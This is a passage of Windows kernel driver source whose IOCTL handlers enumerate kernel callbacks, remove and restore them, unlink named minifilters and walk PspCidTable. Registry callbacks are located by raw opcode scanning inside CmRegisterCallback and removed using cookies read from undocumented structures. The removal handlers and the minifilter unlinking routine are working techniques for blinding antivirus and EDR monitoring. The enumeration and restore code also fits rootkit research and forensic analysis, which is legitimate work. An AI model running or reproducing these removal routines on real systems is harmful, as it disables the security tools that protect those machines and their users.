							ANSI_STRING altitudeAnsi;
							altitudeAnsi.Buffer = cbInfo->Altitude;
							altitudeAnsi.Length = 0;
							altitudeAnsi.MaximumLength = MAX_ALTITUDE_LENGTH - 1;

							RtlUnicodeStringToAnsiString(&altitudeAnsi, &altitudeUnicode, FALSE);
						}
					}

					// Resolve module name and RVA offsets (OCKC style)
					if (cbInfo->PreOperationCallback)
					{
						CallbackInformation tempInfo = { 0 };
						tempInfo.CallbackAddress = cbInfo->PreOperationCallback;
						SearchLoadedModules(&tempInfo);
						RtlCopyMemory(cbInfo->ModuleName, tempInfo.ModuleName, MAX_MODULE_NAME_LENGTH);
						cbInfo->ModuleBase = tempInfo.ModuleBase;
						cbInfo->PreOperationOffset = tempInfo.ModuleOffset;
					}
					if (cbInfo->PostOperationCallback)
					{
						CallbackInformation tempInfo = { 0 };
						tempInfo.CallbackAddress = cbInfo->PostOperationCallback;
						SearchLoadedModules(&tempInfo);
						if (cbInfo->ModuleName[0] == '\0')
						{
							RtlCopyMemory(cbInfo->ModuleName, tempInfo.ModuleName, MAX_MODULE_NAME_LENGTH);
							cbInfo->ModuleBase = tempInfo.ModuleBase;
						}
						cbInfo->PostOperationOffset = tempInfo.ModuleOffset;
					}

					KdPrint((DRIVER_PREFIX "[%d] ThreadObjCallback: Pre=0x%llX(+0x%llX) Post=0x%llX(+0x%llX) -> %s (Alt: %s)\n",
						callbackCount, cbInfo->PreOperationCallback, cbInfo->PreOperationOffset,
						cbInfo->PostOperationCallback, cbInfo->PostOperationOffset,
						cbInfo->ModuleName, cbInfo->Altitude));

					callbackCount++;
				}

				entry = entry->Flink;
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception during object callback enumeration\n"));
		status = STATUS_UNSUCCESSFUL;
	}

	response->Count = callbackCount;
	KdPrint((DRIVER_PREFIX "Found %d total object callbacks\n", callbackCount));
	*info = requiredSize;
	return status;
}

// ============== Registry Callback Enumeration (RCK style) ==============

// Registry callback item structure (from CmRegisterCallback internal structures)
typedef struct _REGISTRY_CALLBACK_ITEM {
	LIST_ENTRY Item;
	DWORD64 Unknown1[2];
	DWORD64 Context;
	DWORD64 Function;
	UNICODE_STRING Altitude;
	DWORD64 Unknown2[2];
} REGISTRY_CALLBACK_ITEM, * PREGISTRY_CALLBACK_ITEM;

// Find the CallbackListHead for registry callbacks using signature scanning (RCK style)
ULONG64 FindCmCallbackListHead()
{
	// Get the address of nt!CmRegisterCallback
	UNICODE_STRING routineName;
	RtlInitUnicodeString(&routineName, L"CmRegisterCallback");
	ULONG64 routineAddress = (ULONG64)MmGetSystemRoutineAddress(&routineName);
	if (!routineAddress)
	{
		KdPrint((DRIVER_PREFIX "Failed to find CmRegisterCallback\n"));
		return 0;
	}
	KdPrint((DRIVER_PREFIX "CmRegisterCallback at 0x%llX\n", routineAddress));

	// Search for the first CALL or JMP instruction to find CmpRegisterCallbackInternal
	ULONG64 tempAddress = 0;
	for (int offset = 0; offset < 200; offset++)
	{
		UCHAR instruction = *(PUCHAR)(routineAddress + offset);
		if (instruction == 0xE9 || instruction == 0xE8)  // JMP or CALL
		{
			LONG relativeOffset = *(LONG*)(routineAddress + offset + 1);
			tempAddress = routineAddress + offset + 5 + relativeOffset;
			KdPrint((DRIVER_PREFIX "Found CmpRegisterCallbackInternal at 0x%llX\n", tempAddress));
			break;
		}
	}

	if (!tempAddress)
	{
		KdPrint((DRIVER_PREFIX "Failed to find CmpRegisterCallbackInternal\n"));
		return 0;
	}

	// Scan for the last INT 3 (0xCC) in CmpRegisterCallbackInternal
	// The function CmpInsertCallbackInListByAltitude follows the INT 3 padding
	ULONG64 CmpInsertCallbackInListByAltitudeAddr = 0;
	for (int i = 0; i < 1024; i++)
	{
		if (*(PUCHAR)(tempAddress + i) == 0xCC)
		{
			// Skip all consecutive INT 3 instructions
			while (*(PUCHAR)(tempAddress + i) == 0xCC) i++;

			CmpInsertCallbackInListByAltitudeAddr = tempAddress + i;
			KdPrint((DRIVER_PREFIX "Found CmpInsertCallbackInListByAltitude at 0x%llX\n",
				CmpInsertCallbackInListByAltitudeAddr));
			break;
		}
	}

	if (!CmpInsertCallbackInListByAltitudeAddr)
	{
		KdPrint((DRIVER_PREFIX "Failed to find CmpInsertCallbackInListByAltitude\n"));
		return 0;
	}

	// Search for the first LEA instruction to find CallbackListHead
	ULONG64 callbackListHead = 0;
	for (int i = 0; i < 300; i++)
	{
		// Check for LEA opcode (0x4C 0x8D for LEA RXX, [address])
		if ((*(PUCHAR)(CmpInsertCallbackInListByAltitudeAddr + i) == 0x4C) &&
			*(PUCHAR)(CmpInsertCallbackInListByAltitudeAddr + i + 1) == 0x8D)
		{
			// Extract the relative offset (4 bytes following the opcode and ModR/M byte)
			LONG offset = *(LONG*)(CmpInsertCallbackInListByAltitudeAddr + i + 3);

			// Calculate the address of CallbackListHead: current position + instruction length (7) + offset
			callbackListHead = CmpInsertCallbackInListByAltitudeAddr + i + 7 + offset;
			KdPrint((DRIVER_PREFIX "Found CallbackListHead at 0x%llX\n", callbackListHead));
			break;
		}
	}

	return callbackListHead;
}

// Helper to search for module containing a registry callback
void SearchModulesForRegistry(RegistryCallbackInfo* CallbackInfo)
{
	NTSTATUS status;
	ULONG modulesSize = 0;
	AUX_MODULE_EXTENDED_INFO* modules = nullptr;
	ULONG numberOfModules = 0;

	status = AuxKlibInitialize();
	if (!NT_SUCCESS(status))
	{
		return;
	}

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);
	if (!NT_SUCCESS(status) || modulesSize == 0)
	{
		return;
	}

	numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);
	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
	if (!modules)
	{
		return;
	}

	RtlZeroMemory(modules, modulesSize);
	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
	if (!NT_SUCCESS(status))
	{
		ExFreePoolWithTag(modules, DRIVER_TAG);
		return;
	}

	// Find the module containing the callback address
	for (ULONG i = 0; i < numberOfModules; i++)
	{
		ULONG64 moduleBase = (ULONG64)modules[i].BasicInfo.ImageBase;
		ULONG64 moduleEnd = moduleBase + modules[i].ImageSize;

		if (CallbackInfo->CallbackAddress >= moduleBase && CallbackInfo->CallbackAddress < moduleEnd)
		{
			// Found the module
			CallbackInfo->ModuleBase = moduleBase;
			CallbackInfo->ModuleOffset = CallbackInfo->CallbackAddress - moduleBase;

			// Copy module name (filename only)
			const char* fullPath = (const char*)(modules[i].FullPathName + modules[i].FileNameOffset);
			strncpy(CallbackInfo->ModuleName, fullPath, MAX_MODULE_NAME_LENGTH - 1);
			CallbackInfo->ModuleName[MAX_MODULE_NAME_LENGTH - 1] = '\0';
			break;
		}
	}

	ExFreePoolWithTag(modules, DRIVER_TAG);
}

NTSTATUS HandleEnumRegistryCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating registry callbacks (CmRegisterCallback)\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumRegistryCallbacksResponse) +
		(sizeof(RegistryCallbackInfo) * (MAX_REGISTRY_CALLBACK_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %d bytes, got %d)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumRegistryCallbacksResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, requiredSize);

	// Find the CallbackListHead
	ULONG64 callbackListHead = FindCmCallbackListHead();
	if (!callbackListHead)
	{
		KdPrint((DRIVER_PREFIX "Failed to find registry CallbackListHead\n"));
		return STATUS_NOT_FOUND;
	}

	ULONG callbackCount = 0;
	NTSTATUS status = STATUS_SUCCESS;

	__try
	{
		// The CallbackListHead is the head of a linked list of REGISTRY_CALLBACK_ITEM
		PREGISTRY_CALLBACK_ITEM currentItem = (PREGISTRY_CALLBACK_ITEM)callbackListHead;

		// Start from the first entry (Flink from the list head)
		// The list head itself is part of the structure, so we navigate from Item.Flink
		PLIST_ENTRY entry = ((PLIST_ENTRY)callbackListHead)->Flink;

		while ((ULONG64)entry != callbackListHead && callbackCount < MAX_REGISTRY_CALLBACK_ENTRIES)
		{
			PREGISTRY_CALLBACK_ITEM callbackItem = CONTAINING_RECORD(entry, REGISTRY_CALLBACK_ITEM, Item);

			if (callbackItem && MmIsAddressValid(callbackItem) && callbackItem->Function != 0)
			{
				RegistryCallbackInfo* cbInfo = &response->Entries[callbackCount];
				cbInfo->Index = callbackCount;
				cbInfo->CallbackAddress = callbackItem->Function;
				cbInfo->Context = callbackItem->Context;

				// Get altitude from UNICODE_STRING
				if (callbackItem->Altitude.Buffer && MmIsAddressValid(callbackItem->Altitude.Buffer))
				{
					ANSI_STRING ansiAltitude;
					NTSTATUS convStatus = RtlUnicodeStringToAnsiString(&ansiAltitude, &callbackItem->Altitude, TRUE);
					if (NT_SUCCESS(convStatus))
					{
						strncpy(cbInfo->Altitude, ansiAltitude.Buffer, MAX_ALTITUDE_LENGTH - 1);
						cbInfo->Altitude[MAX_ALTITUDE_LENGTH - 1] = '\0';
						RtlFreeAnsiString(&ansiAltitude);
					}
				}

				// Resolve module information
				SearchModulesForRegistry(cbInfo);

				KdPrint((DRIVER_PREFIX "[%d] RegistryCallback: 0x%llX (%s+0x%llX) Altitude=%s\n",
					callbackCount, cbInfo->CallbackAddress, cbInfo->ModuleName,
					cbInfo->ModuleOffset, cbInfo->Altitude));

				callbackCount++;
			}

			// Move to next entry
			entry = entry->Flink;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception during registry callback enumeration\n"));
		status = STATUS_UNSUCCESSFUL;
	}

	response->Count = callbackCount;
	KdPrint((DRIVER_PREFIX "Found %d registry callbacks\n", callbackCount));
	*info = requiredSize;
	return status;
}

NTSTATUS HandleRemoveRegistryCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveRegistryCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveRegistryCallbackRequest))
	{
		KdPrint((DRIVER_PREFIX "Buffer too small\n"));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveRegistryCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		KdPrint((DRIVER_PREFIX "Invalid parameter: null request\n"));
		return STATUS_INVALID_PARAMETER;
	}

	// Find the CallbackListHead
	ULONG64 callbackListHead = FindCmCallbackListHead();
	if (!callbackListHead)
	{
		KdPrint((DRIVER_PREFIX "Failed to find registry CallbackListHead\n"));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		// Traverse the callback list to find the item at the specified index
		PLIST_ENTRY entry = ((PLIST_ENTRY)callbackListHead)->Flink;
		ULONG currentIndex = 0;
		BOOLEAN found = FALSE;

		while ((ULONG64)entry != callbackListHead)
		{
			if (currentIndex == request->Index)
			{
				PREGISTRY_CALLBACK_ITEM callbackItem = CONTAINING_RECORD(entry, REGISTRY_CALLBACK_ITEM, Item);

				if (callbackItem && MmIsAddressValid(callbackItem))
				{
					// Read Cookie using dynamic offset (or default 0x18)
					ULONG cookieOffset = g_RegistryCallbackOffsets.IsInitialized ? 
						g_RegistryCallbackOffsets.CookieOffset : 0x18;
					ULONG functionOffset = g_RegistryCallbackOffsets.IsInitialized ?
						g_RegistryCallbackOffsets.FunctionOffset : 0x28;
					
					LARGE_INTEGER cookie = *(PLARGE_INTEGER)((PUCHAR)callbackItem + cookieOffset);
					ULONG64 oldFunction = *(PULONG64)((PUCHAR)callbackItem + functionOffset);

					// Save original values for restoration
					g_RemovedRegistryCallbacks[request->Index].IsRemoved = TRUE;
					g_RemovedRegistryCallbacks[request->Index].OriginalFunction = oldFunction;
					g_RemovedRegistryCallbacks[request->Index].CallbackItem = callbackItem;
					g_RemovedRegistryCallbacks[request->Index].OriginalLinks.Flink = callbackItem->Item.Flink;
					g_RemovedRegistryCallbacks[request->Index].OriginalLinks.Blink = callbackItem->Item.Blink;

					// Use CmUnRegisterCallback for safe removal (handles synchronization)
					NTSTATUS unregStatus = CmUnRegisterCallback(cookie);
					if (NT_SUCCESS(unregStatus))
					{
						KdPrint((DRIVER_PREFIX "Removed registry callback at index %d via CmUnRegisterCallback (Cookie=0x%llX, Function=0x%llX)\n",
							request->Index, cookie.QuadPart, oldFunction));
						found = TRUE;
					}
					else
					{
						KdPrint((DRIVER_PREFIX "CmUnRegisterCallback failed (0x%X), callback may already be removed\n", unregStatus));
						// Still mark as removed since we saved the info
						found = TRUE;
					}
				}
				break;
			}

			currentIndex++;
			entry = entry->Flink;
		}

		if (!found)
		{
			KdPrint((DRIVER_PREFIX "Registry callback at index %d not found\n", request->Index));
			return STATUS_NOT_FOUND;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing registry callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleSetRegistryCallbackOffsets(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleSetRegistryCallbackOffsets called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(SetRegistryCallbackOffsetsRequest))
	{
		KdPrint((DRIVER_PREFIX "Buffer too small\n"));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (SetRegistryCallbackOffsetsRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate offsets are reasonable (within typical structure size)
	if (request->CookieOffset > 0x100 || request->FunctionOffset > 0x100 ||
		request->ContextOffset > 0x100 || request->AltitudeOffset > 0x100)
	{
		KdPrint((DRIVER_PREFIX "Invalid offsets: Cookie=0x%X, Function=0x%X, Context=0x%X, Altitude=0x%X\n",
			request->CookieOffset, request->FunctionOffset, request->ContextOffset, request->AltitudeOffset));
		return STATUS_INVALID_PARAMETER;
	}

	// Update global offsets
	g_RegistryCallbackOffsets.CookieOffset = request->CookieOffset;
	g_RegistryCallbackOffsets.FunctionOffset = request->FunctionOffset;
	g_RegistryCallbackOffsets.ContextOffset = request->ContextOffset;
	g_RegistryCallbackOffsets.AltitudeOffset = request->AltitudeOffset;
	g_RegistryCallbackOffsets.IsInitialized = TRUE;

	KdPrint((DRIVER_PREFIX "Registry callback offsets set: Cookie=0x%X, Function=0x%X, Context=0x%X, Altitude=0x%X\n",
		request->CookieOffset, request->FunctionOffset, request->ContextOffset, request->AltitudeOffset));

	return STATUS_SUCCESS;
}

// ============== Callback Restore Handlers ==============

NTSTATUS HandleRestoreProcessCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreProcessCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Check if we have saved data for this index
	if (!g_RemovedProcessCallbacks[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved process callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		ULONG64 slotAddress = g_RemovedProcessCallbacks[request->Index].SlotAddress;
		ULONG64 originalValue = g_RemovedProcessCallbacks[request->Index].OriginalValue;

		// Verify the slot is still valid
		if (!MmIsAddressValid((PVOID)slotAddress))
		{
			KdPrint((DRIVER_PREFIX "Slot address 0x%llX is no longer valid\n", slotAddress));
			return STATUS_INVALID_ADDRESS;
		}

		// Restore the original value
		*(PULONG64)slotAddress = originalValue;

		// Clear the saved data
		g_RemovedProcessCallbacks[request->Index].IsRemoved = FALSE;
		g_RemovedProcessCallbacks[request->Index].OriginalValue = 0;
		g_RemovedProcessCallbacks[request->Index].SlotAddress = 0;

		KdPrint((DRIVER_PREFIX "Restored process callback at index %d\n", request->Index));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while restoring process callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRestoreThreadCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreThreadCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	if (!g_RemovedThreadCallbacks[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved thread callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		ULONG64 slotAddress = g_RemovedThreadCallbacks[request->Index].SlotAddress;
		ULONG64 originalValue = g_RemovedThreadCallbacks[request->Index].OriginalValue;

		if (!MmIsAddressValid((PVOID)slotAddress))
		{
			return STATUS_INVALID_ADDRESS;
		}

		*(PULONG64)slotAddress = originalValue;

		g_RemovedThreadCallbacks[request->Index].IsRemoved = FALSE;
		g_RemovedThreadCallbacks[request->Index].OriginalValue = 0;
		g_RemovedThreadCallbacks[request->Index].SlotAddress = 0;

		KdPrint((DRIVER_PREFIX "Restored thread callback at index %d\n", request->Index));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRestoreImageCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreImageCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	if (!g_RemovedImageCallbacks[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved image callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		ULONG64 slotAddress = g_RemovedImageCallbacks[request->Index].SlotAddress;
		ULONG64 originalValue = g_RemovedImageCallbacks[request->Index].OriginalValue;

		if (!MmIsAddressValid((PVOID)slotAddress))
		{
			return STATUS_INVALID_ADDRESS;
		}

		*(PULONG64)slotAddress = originalValue;

		g_RemovedImageCallbacks[request->Index].IsRemoved = FALSE;
		g_RemovedImageCallbacks[request->Index].OriginalValue = 0;
		g_RemovedImageCallbacks[request->Index].SlotAddress = 0;

		KdPrint((DRIVER_PREFIX "Restored image callback at index %d\n", request->Index));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRestoreObjectCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreObjectCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreObjectCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreObjectCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Select the correct storage array based on object type
	RemovedObjectCallback* storage = (request->ObjectType == ObjectCallbackProcess)
		? g_RemovedProcessObjectCallbacks
		: g_RemovedThreadObjectCallbacks;

	if (!storage[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved object callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		PCALLBACK_ENTRY_ITEM callbackItem = (PCALLBACK_ENTRY_ITEM)storage[request->Index].CallbackEntryItem;

		if (!callbackItem || !MmIsAddressValid(callbackItem))
		{
			return STATUS_INVALID_ADDRESS;
		}

		// Restore PreOperation if requested and we have saved data
		if (request->RestorePreOperation && storage[request->Index].PreOperation)
		{
			InterlockedExchangePointer((PVOID*)&callbackItem->PreOperation,
				storage[request->Index].PreOperation);
			KdPrint((DRIVER_PREFIX "Restored PreOperation to 0x%llX\n",
				(ULONG64)storage[request->Index].PreOperation));
			storage[request->Index].PreOperation = NULL;
		}

		// Restore PostOperation if requested and we have saved data
		if (request->RestorePostOperation && storage[request->Index].PostOperation)
		{
			InterlockedExchangePointer((PVOID*)&callbackItem->PostOperation,
				storage[request->Index].PostOperation);
			KdPrint((DRIVER_PREFIX "Restored PostOperation to 0x%llX\n",
				(ULONG64)storage[request->Index].PostOperation));
			storage[request->Index].PostOperation = NULL;
		}

		// If both operations are restored, clear the removed flag
		if (!storage[request->Index].PreOperation && !storage[request->Index].PostOperation)
		{
			storage[request->Index].IsRemoved = FALSE;
			storage[request->Index].CallbackEntryItem = NULL;
		}

		KdPrint((DRIVER_PREFIX "Restored object callback at index %d\n", request->Index));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRestoreRegistryCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRestoreRegistryCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RestoreRegistryCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RestoreRegistryCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_REGISTRY_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	if (!g_RemovedRegistryCallbacks[request->Index].IsRemoved)
	{
		KdPrint((DRIVER_PREFIX "No saved registry callback at index %d\n", request->Index));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		PREGISTRY_CALLBACK_ITEM callbackItem =
			(PREGISTRY_CALLBACK_ITEM)g_RemovedRegistryCallbacks[request->Index].CallbackItem;

		if (!callbackItem || !MmIsAddressValid(callbackItem))
		{
			return STATUS_INVALID_ADDRESS;
		}

		// Restore the original function pointer
		callbackItem->Function = g_RemovedRegistryCallbacks[request->Index].OriginalFunction;

		// Clear the saved data
		g_RemovedRegistryCallbacks[request->Index].IsRemoved = FALSE;
		g_RemovedRegistryCallbacks[request->Index].OriginalFunction = 0;
		g_RemovedRegistryCallbacks[request->Index].CallbackItem = NULL;

		KdPrint((DRIVER_PREFIX "Restored registry callback at index %d to 0x%llX\n",
			request->Index, callbackItem->Function));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumMinifilters(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating minifilters\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumMinifiltersResponse) +
		(sizeof(MinifilterInfo) * (MAX_MINIFILTER_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %d bytes, got %d)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumMinifiltersResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, requiredSize);

	ULONG filterCount = 0;

	// Enumerate using Filter Manager APIs (documented approach)
	BOOLEAN success = EnumerateMinifiltersViaApi(response->Entries, &filterCount, MAX_MINIFILTER_ENTRIES);

	if (!success)
	{
		KdPrint((DRIVER_PREFIX "Minifilter enumeration failed - Filter Manager APIs unavailable\n"));
	}

	response->Count = filterCount;
	KdPrint((DRIVER_PREFIX "Found %u total minifilters\n", filterCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

NTSTATUS HandleUnlinkMinifilter(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "Unlink minifilter callbacks request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(UnlinkMinifilterRequest))
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %u, got %u)\n",
			(ULONG)sizeof(UnlinkMinifilterRequest), inputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (UnlinkMinifilterRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure null-terminated
	request->FilterName[MAX_FILTER_NAME_LENGTH - 1] = L'\0';

	KdPrint((DRIVER_PREFIX "Unlinking callbacks for filter: %ws\n", request->FilterName));

	NTSTATUS status = UnlinkMinifilterCallbacks(request->FilterName);

	if (NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Successfully unlinked minifilter callbacks\n"));
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Failed to unlink minifilter callbacks: 0x%08X\n", status));
	}

	return status;
}

NTSTATUS HandleEnumDrivers(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Driver enumeration request\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumDriversResponse) +
		(sizeof(KernelDriverInfo) * (MAX_DRIVER_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %u, got %u)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumDriversResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, requiredSize);

	ULONG driverCount = 0;
	BOOLEAN success = EnumerateKernelDrivers(response->Entries, &driverCount, MAX_DRIVER_ENTRIES);

	if (!success)
	{
		return STATUS_UNSUCCESSFUL;
	}

	response->Count = driverCount;
	KdPrint((DRIVER_PREFIX "Returning %u drivers\n", driverCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumPspCidTable(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "PspCidTable enumeration request\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumCidTableResponse) + (sizeof(CidEntry) * (MAX_CID_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumCidTableResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Find PspCidTable
	PVOID64 pspCidTableAddr = GetPspCidTableAddress();
	if (!pspCidTableAddr)
	{
		KdPrint((DRIVER_PREFIX "Failed to locate PspCidTable\n"));
		return STATUS_NOT_FOUND;
	}

	NTSTATUS status = STATUS_SUCCESS;

	__try
	{
		// Get HANDLE_TABLE pointer
		PVOID64 handleTable = *(PVOID64*)pspCidTableAddr;
		if (!MmIsAddressValid(handleTable))
		{
			KdPrint((DRIVER_PREFIX "Invalid HANDLE_TABLE address\n"));
			return STATUS_INVALID_ADDRESS;
		}

		// Get TableCode (offset +8 in _HANDLE_TABLE)
		ULONG64 tableCode = *(PULONG64)((ULONG64)handleTable + 8);
		KdPrint((DRIVER_PREFIX "TableCode: 0x%llX\n", tableCode));

		// Extract table level from lower 2 bits
		INT tableLevel = (INT)(tableCode & 3);
		ULONG64 tableBase = tableCode & ~3ULL;

		KdPrint((DRIVER_PREFIX "Table level: %d, Base: 0x%llX\n", tableLevel, tableBase));

		// Initialize response
		response->Count = 0;

		// Parse based on table level
		if (tableLevel == 0)
		{
			// Level-1 table
			ParseCidTable1(tableBase, 0, 0, response->Entries, &response->Count, MAX_CID_ENTRIES);
		}
		else if (tableLevel == 1)
		{
			// Level-2 table
			ParseCidTable2(tableBase, 0, response->Entries, &response->Count, MAX_CID_ENTRIES);
		}
		else if (tableLevel == 2)
		{
			// Level-3 table
			ParseCidTable3(tableBase, response->Entries, &response->Count, MAX_CID_ENTRIES);
		}
		else
		{
			KdPrint((DRIVER_PREFIX "Invalid table level: %d\n", tableLevel));
			return STATUS_INVALID_PARAMETER;
		}

		KdPrint((DRIVER_PREFIX "Enumerated %u CID entries\n", response->Count));
		*info = sizeof(EnumCidTableResponse) + (sizeof(CidEntry) * (response->Count > 0 ? response->Count - 1 : 0));
		status = STATUS_SUCCESS;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
